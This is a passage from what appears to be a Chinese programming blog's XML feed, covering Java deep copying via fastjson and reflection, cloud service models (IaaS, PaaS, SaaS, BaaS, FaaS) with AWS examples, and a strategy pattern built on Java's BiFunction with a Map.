class="string">"小区2"</span>);</span><br><span class="line">        UserJson user = <span class="keyword">new</span> UserJson(<span class="string">"小李"</span>, address);</span><br><span class="line">        <span class="comment">// 使用fastjson序列化进行深拷贝</span></span><br><span class="line">        JSONObject.parseObject(JSONObject.toJSONBytes(condition), UserJson<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        user.getAddress().setAddress1(<span class="string">"小区3"</span>);</span><br><span class="line">        <span class="comment">// false</span></span><br><span class="line">        System.out.println(user == copyUser);</span><br><span class="line">        <span class="comment">// false</span></span><br><span class="line">        System.out.println(user.getAddress().getAddress1().equals(copyUser.getAddress().getAddress1()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-反射实例化新对象"><a href="#5-反射实例化新对象" class="headerlink" title="5.反射实例化新对象"></a>5.反射实例化新对象</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">deepCopy</span><span class="params">(Object source, Class&lt;T&gt; target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Objects.isNull(source) || Objects.isNull(target)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;Field&gt; sourceFields = getFields(source.getClass());</span><br><span class="line">    List&lt;Field&gt; targetFields = getFields(target);</span><br><span class="line">    T t = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        t = newInstance(source, target, sourceFields, targetFields);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取一个类中的所有属性（包括父类属性）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> c 类名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> List&lt;Field&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;Field&gt; <span class="title">getFields</span><span class="params">(Class&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">    List&lt;Field&gt; fieldList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    Field[] fields = c.getDeclaredFields();</span><br><span class="line">    <span class="keyword">if</span> (fields.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        fieldList.addAll(Arrays.asList(fields));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getSuperClassFields(c, fieldList);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 递归获取父类属性</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> o         类名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> allFields 外层定义的所有属性集合</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 父类所有属性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;Field&gt; <span class="title">getSuperClassFields</span><span class="params">(Class&lt;?&gt; o, List&lt;Field&gt; allFields)</span> </span>&#123;</span><br><span class="line">    Class&lt;?&gt; superclass = o.getSuperclass();</span><br><span class="line">    <span class="keyword">if</span> (Objects.isNull(superclass) || Object<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>().<span class="title">equals</span>(<span class="title">superclass</span>.<span class="title">getName</span>())) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> allFields;</span><br><span class="line">    &#125;</span><br><span class="line">    Field[] fields = superclass.getDeclaredFields();</span><br><span class="line">    <span class="keyword">if</span> (fields.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> allFields;</span><br><span class="line">    &#125;</span><br><span class="line">    allFields.addAll(Arrays.asList(fields));</span><br><span class="line">    <span class="keyword">return</span> getSuperClassFields(superclass, allFields);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 目标实例化对象</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> source       原对实例化象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> target       目标对象类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> sourceFields 源对象字段集合</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> targetFields 目标对象属性字段集合</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 目标实例化对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">newInstance</span><span class="params">(Object source, Class&lt;T&gt; target, List&lt;Field&gt; sourceFields,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 List&lt;Field&gt; targetFields)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    T t = target.newInstance();</span><br><span class="line">    <span class="keyword">if</span> (targetFields.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (Field field : sourceFields) &#123;</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o = field.get(source);</span><br><span class="line">        Field sameField = getSameField(field, targetFields);</span><br><span class="line">        <span class="keyword">if</span> (Objects.nonNull(sameField)) &#123;</span><br><span class="line">            sameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            sameField.set(t, o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取目标对象中同源对象属性相同的属性（字段名称，字段类型一致则判定为相同）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> field  源对象属性</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fields 目标对象属性集合</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 目标对象相同的属性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Field <span class="title">getSameField</span><span class="params">(Field field, List&lt;Field&gt; fields)</span> </span>&#123;</span><br><span class="line">    String name = field.getName();</span><br><span class="line">    String type = field.getType().getName();</span><br><span class="line">    <span class="keyword">for</span> (Field f : fields) &#123;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(f.getName()) &amp;&amp; type.equals(f.getType().getName())) &#123;</span><br><span class="line">            <span class="keyword">return</span> f;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="额外注意"><a href="#额外注意" class="headerlink" title="额外注意"></a>额外注意</h4><p>平常经常使用的org.springframework.beans.BeanUtils.copyProperties（object1,object2）是浅拷贝。</p>]]></content>
      
      
      
        <tags>
            
            <tag> json </tag>
            
            <tag> 深拷贝 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云计算服务类型IaaS,PaaS,SaaS,BaaS,FaaS</title>
      <link href="/2022/12/07/%E4%BA%91%E8%AE%A1%E7%AE%97%E6%9C%8D%E5%8A%A1%E7%B1%BB%E5%9E%8BIaaS-PaaS-SaaS-BaaS-FaaS/"/>
      <url>/2022/12/07/%E4%BA%91%E8%AE%A1%E7%AE%97%E6%9C%8D%E5%8A%A1%E7%B1%BB%E5%9E%8BIaaS-PaaS-SaaS-BaaS-FaaS/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近学习AWS遇到了各种云计算服务类型IaaS,PaaS,SaaS,BaaS,FaaS特此记录各种云计算类型。</p><p>AWS官方文档介绍:<a href="https://aws.amazon.com/cn/types-of-cloud-computing/" target="_blank" rel="noopener">Types of Cloud Computing</a></p><p>下图为本地架构,IaaS,PaaS,SaaS之间的区别</p><p><img src="/img/AWS/IaaS,SaaS,PaaS.png" alt="本地架构,IaaS,PaaS,SaaS之间的区别"></p><p>概述:</p><ul><li>基础设施即服务 (IaaS):</li></ul><p>基础设施即服务有时缩写为 IaaS，包含云 IT 的基本构建块，通常提供对联网功能、计算机（虚拟或专用硬件）以及数据存储空间的访问。基础设施即服务提供最高等级的灵活性和对 IT 资源的管理控制，其机制与现今众多 IT 部门和开发人员所熟悉的现有 IT 资源最为接近。</p><ul><li>平台即服务 (PaaS)：</li></ul><p>平台即服务消除了组织对底层基础设施（一般是硬件和操作系统）的管理需要，让您可以将更多精力放在应用程序的部署和管理上面。这有助于提高效率，因为您不用操心资源购置、容量规划、软件维护、补丁安装或与应用程序运行有关的任何无差别的繁重工作。</p><ul><li>软件即服务 (SaaS)：</li></ul><p>软件即服务提供了一种完善的产品，其运行和管理皆由服务提供商负责。人们通常所说的软件即服务指的是终端用户应用程序。使用 SaaS 产品时，服务的维护和底层基础设施的管理都不用您操心，您只需要考虑怎样使用 SaaS 软件就可以了。SaaS 的常见应用是基于 Web 的电子邮件，在这种应用场景中，您可以收发电子邮件而不用管理电子邮件产品的功能添加，也不需要维护电子邮件程序运行所在的服务器和操作系统。</p><h2 id="IaaS-Infrastructure-as-a-Service-基础架构即服务"><a href="#IaaS-Infrastructure-as-a-Service-基础架构即服务" class="headerlink" title="IaaS(Infrastructure as a Service)基础架构即服务"></a>IaaS(Infrastructure as a Service)基础架构即服务</h2><p>AWS官方文档介绍:<a href="https://aws.amazon.com/cn/what-is/iaas/" target="_blank" rel="noopener">什么是基础设施即服务（IaaS）？</a></p><p>IaaS就是由云服务提供商，提供底层/物理层基础设施资源（服务器，数据中心，环境控制，电源，服务器机房），客户自己部署和执行操作系统或应用程序等各种软件。<br>最常见的形式，就是在阿里云、腾讯云购买ECS(Elastic Compute Service)云服务器、AWS上购买EC2(Amazon Elastic Compute Cloud)等。</p><h2 id="PaaS-Platform-as-a-Service-平台即服务"><a href="#PaaS-Platform-as-a-Service-平台即服务" class="headerlink" title="PaaS(Platform as a Service)平台即服务"></a>PaaS(Platform as a Service)平台即服务</h2><p>平台即服务是指将平台作为一种服务对外提供, 那么我们要学习的云平台, 就是一种<code>PaaS</code>服务PaaS处于中间层，服务商提供基础设施底层服务，提供操作系统（Windows，Linux）、数据库服务器、Web服务器、域控制器和其他中间件，以及服务模型中的备份服务等中件层服务。</p><p>下面用几款PaaS类型的AWS产品举例说明:</p><ul><li>S3 - Amazon Simple Storage Service</li></ul><p><a href="https://aws.amazon.com/cn/s3/?nc2=h_ql_prod_st_s3" target="_blank" rel="noopener">S3官方文档</a></p><p>S3 是一种面向 Internet 的存储服务。您可以通过 Amazon S3 随时在 Web 上的任何位置存储和检索的任意大小的数据。您可以使用 AWS 管理控制台简单而直观的 web 界面来完成这些任务。</p><p>通俗的说，S3就是AWS提供的一款 分布式的对象存储服务。可以认为S3是AWS云上的HDFS。</p><p>我们可以将其当做是一个云上的私有网盘存储。</p><p>可以帮助我们存储公司内的业务数据，并支持各种编程语言对其进行开发</p><blockquote><p>简单来说，就是云上的HDFS、或者网盘。</p><p>可以存储数据，同时S3支持编程开发，可以使用许多编程语言操作S3.</p></blockquote><ul><li>AWS Deep Learning AMI</li></ul><p><a href="https://aws.amazon.com/cn/machine-learning/amis/?nc2=type_a" target="_blank" rel="noopener">AWS Deep Learning AMI（DLAMI）官方文档</a></p><p>AWS Deep Learning AMI 可以为机器学习专业人员和研究人员提供基础设施和各种工具，从而加速云中任意规模的深度学习进程。您可以在 Amazon Linux 或 Ubuntu（预先安装了流行的深度学习框架）上快速启动 Amazon EC2 实例。框架示例包括 Apache MXNet 和 Gluon、TensorFlow、Microsoft Cognitive Toolkit (CNTK)、Caffe、Caffe2、Theano、Torch 和 Keras。您可以使用这些框架训练复杂的自定义 AI 模型、试验新算法或学习新技能和技术。</p><ul><li>Cloud Watch - 云监控平台</li></ul><p>(Cloud Watch官方文档)[<a href="https://aws.amazon.com/cn/cloudwatch/?nc2=type_a" target="_blank" rel="noopener">https://aws.amazon.com/cn/cloudwatch/?nc2=type_a</a>]</p><p>AWS Cloud Watch 是一个统一的指标收集、监控、报警等功能一体的监控处理平台。</p><p>全部AWS服务均可无缝对接CloudWatch（系统内置功能），所有服务均可从CloudWatch上进行指标查看、报警配置等。</p><p>对于自定义需求，CloudWatch也支持SDK进行定制开发。</p><p>总结:PaaS优于IaaS的地方在于，高层级的应用程序服务已经通过设计与测试考验，并能够有效的集成。平台的操作系统，平台的应用补丁，产品的测试运维有云服务厂商全部承担职责。常见的PaaS服务平台如:腾讯地图开发平台，小程序开发平台，物联网设备开发平台。</p><h2 id="SaaS-Software-as-a-Service-软件即服务"><a href="#SaaS-Software-as-a-Service-软件即服务" class="headerlink" title="SaaS(Software as a Service)软件即服务"></a>SaaS(Software as a Service)软件即服务</h2><p>软件即服务, 是指将软件作为一种服务对外提供。服务商提供基于软件的解决方案，满足客户最终需求；如OA、CRM、MIS、ERP、HRM、CM、Office 365、iCloud、G Suite等应用，客户不需考虑任何形式的专业技术知识，获得完整的软件包，使他们的日常工作和生活变得更轻松。<br>SaaS实际上是提供了具体的软件服务，细化到了具体的分类，相比IaaS和PaaS面向程序员，SaaS是直接面向产品经理甚至用户的。</p><p>AWS SaaS相关产品:</p><ul><li>RDS - 云上关系型数据库RDS全称：Amazon Relational Database Service</li></ul><p>是一种 Web 服务，可让用户更轻松地在云中设置、操作和扩展关系数据库。</p><p>同时，RDS也是一款Serverless（无服务器化、全托管）的服务，也就是，不需要准备服务器，只需要鼠标点击几下即可在云上得到一款可用的数据库。</p><p>用户只需要通过网络连接到数据库就可开展业务开发和应用。</p><p>同时，关于数据库的维护、高可用、异常处理等均无需用户管理，这些交由AWS进行管理</p><blockquote><p>简单来说就是在云上创建关系型数据库，然后通过网络连接使用。</p></blockquote><ul><li>DynamoDB - 云上的KV型NoSQL数据库</li></ul><p>DynamoDB是AWS提供的一款KV型、列式存储的NoSQL数据库。</p><p>它也是一款Server Less的服务，用户只需要通过web页面简单的配置，即可得到一款可用的DynamoDB数据库。</p><p>通过网络连接到DynamoDB之上，即可进行业务的开发和构建。</p><p>DynamoDB 的架构和HBase有一定的相识度，它继续分区键来确定数据分区，基于排序键来确定数据排序</p><p>同时支持二级索引，可以为一个DynamoDB表增加最多5个二级索引来加速检索。</p><ul><li>RedShift - 云上的数据仓库服务</li></ul><p>Amazon Redshift 是一种快速、完全托管的 PB 级数据仓库服务，它使得用现有商业智能工具对您的所有数据进行高效分析变得简单而实惠。它为从几百 GB 到 1PB 或更大的数据集而优化，且每年每 TB 花费不到 1 000 USD，为最传统数据仓库存储解决方案成本的十分之一。</p><p>Redshift是AWS提供的一款：快速、大容量、分布式、完全托管（非Serverless）的PB级数据仓库服务。</p><p>Redshift底层基于Postgresql而构造，可以认为是一款分布式的Postgresql数据库，并且Redshift为数仓应用进行了单独的优化，完全适合作为公司内的PB级的大型数仓来使用。</p><p>同时，在市面上，Redshift很受欢迎，许多数仓的生态都加入了Redshift的支持，比如常见的BI领域，许多BI工具都可以直接对Redshift进行BI分析。如：Tableau、PowerBI等。</p><h2 id="Serverless无服务模型"><a href="#Serverless无服务模型" class="headerlink" title="Serverless无服务模型"></a>Serverless无服务模型</h2><p>Serverless 是一种云原生开发模型，允许开发人员构建和运行应用程序而无需管理服务器。 Serverless 并不意味着不需要服务器，只是服务器由云厂商提供服务器的维护，更新，扩展等无差异化的服务器管理的日常工作。开发人员可以将其代码简单的打包部署在无服务器，最大化利用云的弹性可扩展性构建自己的应用程序。IT 的整个发展历程，我们可以看出是从本地为中心，最后到以应用为中心的 Serverless 架构的一系列变革。云计算类型BaaS,FaaS属于Serverless模型。</p><h3 id="Serverless-优势"><a href="#Serverless-优势" class="headerlink" title="Serverless 优势"></a>Serverless 优势</h3><ul><li>以应用为中心，无需运营基础架构</li></ul><p>以应用为中心，无需管理和运营基础架构，部署和升级，IT 人员只需要专注于核心的业务和代码，大大缩短开发周期，同时也大大节省管理基础架构的成本。</p><ul><li>自动伸缩</li></ul><p>底层基础架构根据业务需求，自动伸缩。企业不需要考虑预置多少服务器，比如说 Lambda 会根据业务的负载自动增加和减少 Lambda 实例的个数，保证在极致负载情况下业务的连续性，同时在负载减少时，lambda 也会自动减少实例，没有服务器空跑的情况。</p><ul><li>为价值付费</li></ul><p>Serverless 为价值付费，节省成本。比如说 Lambda 的付费模式，是根据 lambda 函数的运行时长和调用次数来收费的，每一次调用和运行，都是一次真正的客户请求，业务和费用直接关联，没有成本浪费；EventBridge 根据发不到事件总线的事件数量收费，SNSSNS 根据请求的数量收费，等等。</p><ul><li>内置高可用和高安全</li></ul><p>Serverless 内置高可用和高安全，不需要再为此设计再高可用的架构和定期打安全补丁，高可用方面，lambda 函数都是垮可用区扩展，在安全方面比如说每个 lambda 函数都是运行在独立的 firecracker 虚拟机中，lambda 函数实例会被自动回收，杜绝感染，也可以及时更新安全补丁，保证性能的，减少开发工作，提高效率。举个例子，2021 年 12 月很多开发和运维人员花了几周或者上月的时间升级 java Log4j CVE 的安全补丁，但是对于 lambda 的客户来说，他们不需要做任何的事，亚马逊云科技自动更新了 lambda 的 java 安全补丁，客户不需要花费人力和时间管理更新，保证安全性的同时提高了生产效率。</p><p><span style="color:red;">AWS Serverless F&amp;Q: <a href="https://aws.amazon.com/cn/serverless/faqs/" target="_blank" rel="noopener">Serverless F&amp;Q</a></span></p><h3 id="BaaS-Backend-as-a-Service-后端即服务"><a href="#BaaS-Backend-as-a-Service-后端即服务" class="headerlink" title="BaaS(Backend as a Service)后端即服务"></a>BaaS(Backend as a Service)后端即服务</h3><p>Backend as a Service，后端即服务。<br>服务商为客户(开发者)提供整合云后端的服务，如提供文件存储、数据存储、推送服务、身份验证服务等功能，以帮助开发者快速开发应用。</p><p>国外比较知名的BaaS服务提供商是StackMob和Parse。<br>在国内，Talking Data、友盟、Bmob、百度和新浪开发平台均有相关业务。</p><p>事实上google的Firebase也是一个BaaS。Firebase提供了广泛的功能列表，这些功能分为三个阶段，即开发，获取和成长。 开发阶段包括实时数据库，身份验证，云消息传递，存储，托管，测试实验室（用于在设备上测试应用程序）和崩溃报告。 作为商业提供商，它还集成了AdMob平台，可通过您的应用获利。 在发展之路上，您会发现诸如App Indexing，AdWords，Notifications等功能。</p><p>也可以理解为BaaS = IaaS + PaaS + APIs + SDKs，即服务提供商提供了大量的功能，使用方只需要接入sdk，然后使用其api即可。</p><p><span style="color:red;">补充:<code>区块链即服务</code>，这个简称同名，也是BaaS。</span></p><p><span style="color:red;">常见产品: <a href="https://aws.amazon.com/cn/managed-blockchain/?nc2=h_ql_prod_bl_amb" target="_blank" rel="noopener">Amazon Managed Blockchain</a>,阿里云<a href="https://help.aliyun.com/document_detail/89193.html" target="_blank" rel="noopener">Hyperledger Fabric</a> </span></p><h3 id="FaaS-Function-as-a-service-函数即服务"><a href="#FaaS-Function-as-a-service-函数即服务" class="headerlink" title="FaaS(Function as a service)函数即服务"></a>FaaS(Function as a service)函数即服务</h3><p>Function as a service，函数即服务，也叫功能即服务。<br>服务商提供一个平台，允许客户开发、运行和管理应用程序功能，而无需构建和维护通常与开发和启动应用程序相关的基础架构的复杂性。 按照此模型构建应用程序是实现“无服务器”体系结构的一种方式，通常在构建微服务应用程序时使用。</p><p>无服务器计算，当前使用最广泛的是AWS的Lambada。<a href="https://aws.amazon.com/cn/lambda/" target="_blank" rel="noopener">AWS lambda官方文档</a><br>腾讯Serverless云函数：Serverless新手体验<br>阿里云：产品 函数计算<br>FaaS实例最佳实践</p><p>一般情况下，云平台的计算费用取决于调用次数，执行时长，内存消耗。所以如果这个函数的功能代码写得不好，调用次数非常多，执行时间特别长，或者消耗了大量的内存，那么价格就会很贵。<br>一般和BaaS结合，开发一些项目所需的特殊计算，只为实际计算量付费。<br>那么这种服务适合用于计算量偶尔比较高，但是一般情况没有计算量，或者计算量低的服务。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 云计算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-function函数式编程+Map实现轻量级的策略模式</title>
      <link href="/2022/11/14/java-function%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-Map%E5%AE%9E%E7%8E%B0%E8%BD%BB%E9%87%8F%E7%BA%A7%E7%9A%84%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F/"/>
      <url>/2022/11/14/java-function%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-Map%E5%AE%9E%E7%8E%B0%E8%BD%BB%E9%87%8F%E7%BA%A7%E7%9A%84%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>策略模式目的是取代if…else…的写法，但是策略模式一般需要定义<strong>一个接口+多个实现类</strong>，然后使用枚举类（实现享元模式）或者Map（实现享元模式）来维护<strong>type：实现类</strong>的关系。但是很给人一种很<strong>重</strong>的感觉（因为写法有点繁琐，接口类+多个实现类）。</p><h2 id="函数式编程轻量级实现"><a href="#函数式编程轻量级实现" class="headerlink" title="函数式编程轻量级实现"></a>函数式编程轻量级实现</h2><p>借助<strong>lambda中Function+Map</strong>，使用Map+内部类来实现轻量级的策略模式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBiFunction</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1. MAP的value是内部类，即BiFunction接口实现类。免去了要定义一个接口类的工作。</span></span><br><span class="line">    <span class="comment">//2. BiFunction中基础类型不能表示出字段的含义，可借助/*xxx*/注解来表示含义。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ConcurrentMap&lt;Long<span class="comment">/*type*/</span>, BiFunction&lt;Long<span class="comment">/*a*/</span>, Long<span class="comment">/*b*/</span>, User&gt;&gt; MAP =</span><br><span class="line">            Maps.newConcurrentMap();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//spring中，可以使用@PostConstruct注解来完成加载。</span></span><br><span class="line">    &#123;</span><br><span class="line">        MAP.put(<span class="number">1L</span>, (a, b) -&gt; getSimpleUser(a, b));</span><br><span class="line">        MAP.put(<span class="number">2L</span>, <span class="keyword">this</span>::getUser);</span><br><span class="line">        MAP.put(<span class="number">3L</span>, <span class="keyword">this</span>::getComplexUser);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TestBiFunction testBiFunction = <span class="keyword">new</span> TestBiFunction();</span><br><span class="line">        System.out.println(testBiFunction.getUserByType(<span class="number">1L</span>, <span class="number">1001L</span>, <span class="number">1002L</span>));</span><br><span class="line">        System.out.println(testBiFunction.getUserByType(<span class="number">2L</span>, <span class="number">1001L</span>, <span class="number">1002L</span>));</span><br><span class="line">        System.out.println(testBiFunction.getUserByType(<span class="number">3L</span>, <span class="number">1001L</span>, <span class="number">1002L</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据type来选择策略模式，</span></span><br><span class="line"><span class="comment">     * 入参和出参必须是有要求。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUserByType</span><span class="params">(Long type, Long a, Long b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> MAP.get(type).apply(a, b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * spring中，可以此方法中   使用外部类中定义的IOC容器中的bean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getSimpleUser</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">"simple user"</span> + a + b);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUser</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">"user"</span> + a + b);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getComplexUser</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">"complex user"</span> + a + b);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实原理就是借助lambda表达式中已经定义好的接口类（Function、BiFunction），然后MAP中value的值实际是实现Function的匿名内部类，实现的策略方法是apply方法。</p><p>省去了定义策略方法的步骤。<br> 这样就可以完成策略子类的维护与实现。</p><p>转载链接：<a href="https://www.jianshu.com/p/28489c0b8c93" target="_blank" rel="noopener">https://www.jianshu.com/p/28489c0b8c93</a><br>来源：简书</p>]]></content>
      
      
      
        <tags>
            
            <tag> 策略模式 </tag>
            
            <tag> function函数式编程 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>判断inputstream是否为空</title>
      <link href="/2022/10/17/%E5%88%A4%E6%96%ADinputstream%E6%98%AF%E5%90%A6%E4%B8%BA%E7%A9%BA/"/>
      <url>/2022/10/17/%E5%88%A4%E6%96%ADinputstream%E6%98%AF%E5%90%A6%E4%B8%BA%E7%A9%BA/</url>
      
